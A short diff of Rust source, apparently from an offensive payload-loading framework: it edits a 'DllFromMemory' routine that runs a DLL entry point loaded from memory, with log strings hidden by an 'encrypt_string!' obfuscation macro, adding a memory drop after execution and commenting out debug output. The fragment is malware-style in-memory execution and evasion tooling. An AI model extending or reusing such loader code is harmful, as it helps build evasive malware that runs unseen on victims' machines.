@@ -13,7 +13,8 @@ use crate::payload_util::set_permission;
 #[cfg(target_os = "windows")]
 use std::os::raw::c_int;
 #[cfg(target_os = "windows")]
-type DllEntryPoint = extern "C" fn() -> c_int;
+type DllEntryPoint = extern "C" fn();
+//type DllEntryPoint = extern "C" fn() -> c_int;
 #[cfg(target_os = "windows")]
 use crate::python_embedder;
 #[cfg(target_os = "windows")]
@@ -158,7 +159,9 @@ impl DllFromMemory {
                 info!("{}", encrypt_string!("dll_entry_point()"));
 
                 let result = dll_entry_point();
-                debug!("{}{}", encrypt_string!("DLL result = "), result);
+                drop(mm);
+                info!("drop");
+                //debug!("{}{}", encrypt_string!("DLL result = "), result);
             });
             return Ok(PayloadExecThread::Thread(
                 dllthread,
@@ -180,7 +183,9 @@ impl DllFromMemory {
             info!("{}", encrypt_string!("dll_entry_point()"));
 
             let result = dll_entry_point();
-            debug!("{}{}", encrypt_string!("DLL result = "), result);
+            drop(mm);
+            info!("drop");
+            //debug!("{}{}", encrypt_string!("DLL result = "), result);
             return Ok(PayloadExecThread::NoThread());
         }
         // TODO quand on part d'ici, il y a un probleme
